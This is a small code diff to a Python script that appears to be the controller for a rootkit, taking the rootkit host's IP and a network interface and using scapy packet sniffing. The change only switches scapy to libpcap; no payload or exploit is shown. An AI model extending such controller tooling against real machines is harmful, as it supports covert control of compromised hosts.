@@ -21,7 +21,7 @@ from utils.encryption import *
 from utils.validation import validate_ipv4_address, validate_nic_interface
 
 # Third Party Libraries
-from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
+from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS, conf
 
 # Command Line Arguments
 PARSER = argparse.ArgumentParser("./main.py")
@@ -30,6 +30,8 @@ PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
 
+# Manually set scapy to use libpcap.
+conf.use_pcap = True
 
 # Validate Arguments
 if not validate_ipv4_address(ARGS.controller_ip):
